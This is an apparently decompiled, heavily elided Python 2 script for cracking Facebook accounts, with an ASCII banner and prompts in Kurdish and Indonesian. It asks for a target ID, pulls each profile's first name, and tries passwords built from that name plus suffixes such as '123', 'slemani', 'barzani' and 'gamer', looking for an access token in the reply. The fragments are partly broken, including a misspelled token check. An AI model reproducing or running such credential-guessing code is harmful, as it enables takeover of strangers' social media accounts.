...
|_|    \__,_|_| |_| |\__,_|_.__/|_|
    ...
    vuln = '\x1b[32mVuln'
    os.system('clear')
    print '\x1b[0;95mPunjabii\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92...100%  '
    CorrectUsername = 'Kali'
    ...
    def login():
        ...
        try:
            ...
            try:
                ...
                print '\n\x1b[1;96m[!] \x1b[1;91mXATAKAT NAMAUA XATAKAT DAXEL BKAUA'
                keluar()
            ...
            if 'save-device' in url:
                try:
                    ...
                    print '\n\x1b[1;91m[!] XATAKAT NAMAUA XATAKAT DAXEL BKAWA'
                    keluar()
    ...
    def pilih_super():
        ...
        if peak == '':
            ...
            if peak == '1':
                ...
                os.system('clear')
                print logo
                idt = raw_input('\x1b[1;96m[*] ID YAK DABNE : ')
                try:
            ...
            jalan('\x1b[1;34;96m[\xe2\x9a\x92\xef\xb8\x8f] CHWARE BKA ! \xe2\x96\xb6\xef\xb8\x8f')
            titik = ['.   ', '..  ', '... ']
            for o in titik:
        ...
        def main(arg):
            ...
            try:
                ...
                b = json.loads(a.text)
                pass1 = (b['first_name'] + 'hawlere') or (b['first_name'] + 'hawlere12345')
                ...
                if 'access_token' in q:
                    ...
                    pass2 = (b['first_name'] + '123') or (b['first_name'] + '12345')
                    ...
                    if 'access_token' in q:
                        ...
                        pass3 = (b['first_name'] + 'slemani') or (b['first_name'] + 'slemani12345')
                        ...
                        if 'access_toen' in q:
                            ...
                            pass4 = (b['first_name'] + 'barzani') or (b['first_name'] + 'barzani12345')
                            ...
                            if 'access_token' in q:
                                ...
                                pass5 = (b['first_name'] + 'xaylane') or (b['first_name'] + 'xaylane12345')
                                ...
                                if 'access_token' in q:
                                    ...
                                    pass6 = (b['first_name'] + 'gamer') or (b['first_name'] + 'gamer123') or (b['first_name'] + 'gamer12345') 
